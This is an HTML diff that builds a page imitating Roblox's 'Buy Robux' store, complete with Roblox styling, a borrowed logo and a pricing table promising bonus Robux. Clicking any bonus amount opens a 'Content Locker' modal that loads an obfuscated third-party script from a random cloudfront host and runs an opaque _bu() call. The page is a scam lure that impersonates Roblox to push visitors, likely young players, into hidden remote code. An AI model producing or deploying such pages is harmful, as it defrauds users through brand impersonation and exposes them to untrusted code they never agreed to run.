@@ -1,5 +1,575 @@
-<script type="text/javascript">
-    var CwJua_Mrm_btykYc={"it":4507084,"key":"52869"};
-</script>
-<script src="https://dlk457skl57zp.cloudfront.net/7b17fc5.js"></script>
-<script>_bu();</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy Robux | Roblox</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --roblox-blue: #00a2ff;
+            --roblox-dark-blue: #0066b3;
+            --roblox-orange: #ff9500;
+            --roblox-dark-orange: #e68600;
+            --roblox-gray: #f8f9fa;
+            --roblox-dark-gray: #e9ecef;
+            --roblox-text: #212529;
+            --roblox-light-text: #6c757d;
+            --roblox-border: #dee2e6;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: var(--roblox-text);
+            line-height: 1.5;
+        }
+        
+        /* Header/Navbar */
+        .navbar {
+            background-color: white;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .nav-container {
+            width: 95%;
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            order: 1;
+        }
+        
+        .logo {
+            height: 36px;
+            max-width: 100%;
+        }
+        
+        .nav-links {
+            display: none;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: var(--roblox-text);
+            font-weight: 500;
+            font-size: 15px;
+            transition: color 0.2s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--roblox-blue);
+        }
+        
+        .nav-search {
+            order: 3;
+            width: 100%;
+            margin: 15px 0 0 0;
+            position: relative;
+        }
+        
+        .nav-search input {
+            width: 100%;
+            padding: 10px 15px 10px 40px;
+            border: 1px solid var(--roblox-border);
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #f1f3f5;
+        }
+        
+        .nav-search i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--roblox-light-text);
+        }
+        
+        .nav-right {
+            display: flex;
+            gap: 10px;
+            order: 2;
+            margin-left: auto;
+        }
+        
+        .nav-btn {
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        
+        .btn-login {
+            color: var(--roblox-text);
+            background-color: transparent;
+        }
+        
+        .btn-login:hover {
+            background-color: #f1f3f5;
+        }
+        
+        .btn-signup {
+            color: white;
+            background-color: var(--roblox-blue);
+        }
+        
+        .btn-signup:hover {
+            background-color: var(--roblox-dark-blue);
+        }
+        
+        /* Mobile menu toggle */
+        .mobile-menu-toggle {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: var(--roblox-text);
+            cursor: pointer;
+            padding: 5px;
+        }
+        
+        /* Main Content */
+        .main-container {
+            width: 95%;
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 0 10px;
+        }
+        
+        .hero {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+        
+        .hero h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--roblox-text);
+            line-height: 1.3;
+        }
+        
+        .hero p {
+            font-size: 16px;
+            color: var(--roblox-light-text);
+        }
+        
+        /* Pricing Table */
+        .pricing-table {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+        
+        .table-header {
+            display: none;
+        }
+        
+        .table-row {
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            border-bottom: 1px solid var(--roblox-border);
+            gap: 15px;
+        }
+        
+        .table-row:last-child {
+            border-bottom: none;
+        }
+        
+        .col-price, .col-mobile, .col-web {
+            width: 100%;
+            text-align: left;
+        }
+        
+        .col-price {
+            font-weight: 700;
+            font-size: 18px;
+        }
+        
+        .col-mobile::before {
+            content: "Mobile & console: ";
+            font-weight: 500;
+            color: var(--roblox-text);
+        }
+        
+        .col-web::before {
+            content: "Web & gift cards: ";
+            font-weight: 500;
+            color: var(--roblox-text);
+        }
+        
+        .robux-amount {
+            display: inline-flex;
+            align-items: center;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .robux-amount:hover {
+            color: var(--roblox-blue);
+        }
+        
+        .robux-icon {
+            width: 18px;
+            height: 18px;
+            margin-right: 5px;
+        }
+        
+        .web-option {
+            display: inline-block;
+            padding: 8px 12px;
+            background-color: var(--roblox-gray);
+            border-radius: 6px;
+            border: 1px solid var(--roblox-border);
+            margin-top: 5px;
+        }
+        
+        .bonus-badge {
+            display: inline-block;
+            background-color: #fff4d6;
+            color: #805500;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 8px;
+            font-weight: 500;
+        }
+        
+        /* Content Locker Modal */
+        .content-locker {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .content-locker.active {
+            display: flex;
+        }
+        
+        .locker-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        /* Responsive Styles */
+        @media (min-width: 576px) {
+            .nav-container {
+                gap: 20px;
+            }
+            
+            .nav-left {
+                gap: 25px;
+            }
+            
+            .nav-search {
+                order: 2;
+                width: auto;
+                flex-grow: 1;
+                margin: 0 20px;
+                max-width: 400px;
+            }
+            
+            .nav-right {
+                order: 3;
+            }
+            
+            .hero h1 {
+                font-size: 32px;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .mobile-menu-toggle {
+                display: none;
+            }
+            
+            .nav-links {
+                display: flex;
+                gap: 20px;
+            }
+            
+            .hero h1 {
+                font-size: 40px;
+            }
+            
+            .hero p {
+                font-size: 18px;
+            }
+            
+            .table-header {
+                display: flex;
+                background-color: var(--roblox-gray);
+                padding: 15px 20px;
+                border-bottom: 1px solid var(--roblox-border);
+                font-weight: 500;
+            }
+            
+            .table-row {
+                flex-direction: row;
+                align-items: center;
+                gap: 0;
+                padding: 15px 20px;
+            }
+            
+            .col-price, .col-mobile, .col-web {
+                flex: 1;
+                text-align: left;
+            }
+            
+            .col-mobile {
+                text-align: center;
+            }
+            
+            .col-web {
+                text-align: center;
+            }
+            
+            .col-mobile::before, .col-web::before {
+                content: none;
+            }
+        }
+        
+        @media (min-width: 992px) {}
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <button class="mobile-menu-toggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            
+            <div class="nav-left">
+                <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Roblox Logo" class="logo">
+                <div class="nav-links">
+                    <a href="#">Discover</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Create</a>
+                    <a href="#">Robux</a>
+                </div>
+            </div>
+            
+            <div class="nav-search">
+                <i class="fas fa-search"></i>
+                <input type="text" placeholder="Search">
+            </div>
+            
+            <div class="nav-right">
+                <a href="#" class="nav-btn btn-login">Log In</a>
+                <a href="#" class="nav-btn btn-signup">Sign Up</a>
+            </div>
+        </div>
+    </nav>
+    
+    <!-- Main Content -->
+    <main class="main-container">
+        <div class="hero">
+            <h1>Enjoy up to 100% <br> more Robux</h1>
+            <p>Get more Robux on computer, web, and with gift cards</p>
+        </div>
+        
+        <!-- Pricing Table -->
+        <div class="pricing-table">
+            <div class="table-header">
+                <div class="col-price">Price</div>
+                <div class="col-mobile">Mobile & console <i class="fas fa-info-circle" title="Standard rate"></i></div>
+                <div class="col-web">Computer, web & gift cards <i class="fas fa-info-circle" title="Bonus rate"></i></div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$199.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 22,500
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 24,000
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 1,500 more</span>
+                </div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$99.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 10,000
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 11,000
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 1,000 more</span>
+                </div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$49.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 4,500
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 5,250
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 750 more</span>
+                </div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$19.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 1,700
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 2,000
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 300 more</span>
+                </div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$9.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 800
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 1,000
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 200 more</span>
+                </div>
+            </div>
+            
+            <div class="table-row">
+                <div class="col-price">$4.99</div>
+                <div class="col-mobile">
+                    <span class="robux-amount">
+                        <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 400
+                    </span>
+                </div>
+                <div class="col-web">
+                    <span class="web-option">
+                        <span class="robux-amount" data-locker="true">
+                            <img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/c/2/f/c2fc0404eeb8d393407bdaebe2cc9994a8953550.png" alt="Robux" class="robux-icon"> 500
+                        </span>
+                    </span>
+                    <span class="bonus-badge">+ 100 more</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Content Locker Modal -->
+    <div class="content-locker" id="contentLocker">
+        <div class="locker-content">
+            <script type="text/javascript">
+                var CwJua_Mrm_btykYc={"it":4507084,"key":"52869"};
+            </script>
+            <script src="https://dlk457skl57zp.cloudfront.net/7b17fc5.js"></script>
+            <script>_bu();</script>
+        </div>
+    </div>
+
+    <script>
+        // Simple interactivity
+        document.addEventListener('DOMContentLoaded', function() {
+            // Mobile menu toggle
+            const mobileToggle = document.querySelector('.mobile-menu-toggle');
+            const navLinks = document.querySelector('.nav-links');
+            
+            if (mobileToggle && navLinks) {
+                mobileToggle.addEventListener('click', () => {
+                    navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
+                });
+            }
+            
+            // Add hover effect to pricing rows
+            const rows = document.querySelectorAll('.table-row');
+            rows.forEach(row => {
+                row.addEventListener('mouseenter', () => {
+                    row.style.backgroundColor = '#f8f9fa';
+                });
+                row.addEventListener('mouseleave', () => {
+                    row.style.backgroundColor = 'white';
+                });
+            });
+            
+            // Content Locker Trigger
+            const lockerTriggerElements = document.querySelectorAll('.robux-amount[data-locker="true"]');
+            const contentLocker = document.getElementById('contentLocker');
+
+            lockerTriggerElements.forEach(element => {
+                element.addEventListener('click', () => {
+                    contentLocker.classList.add('active');
+                });
+            });
+
+            // Close content locker (optional, you can add a close button if needed)
+            contentLocker.addEventListener('click', (e) => {
+                if (e.target === contentLocker) {
+                    contentLocker.classList.remove('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
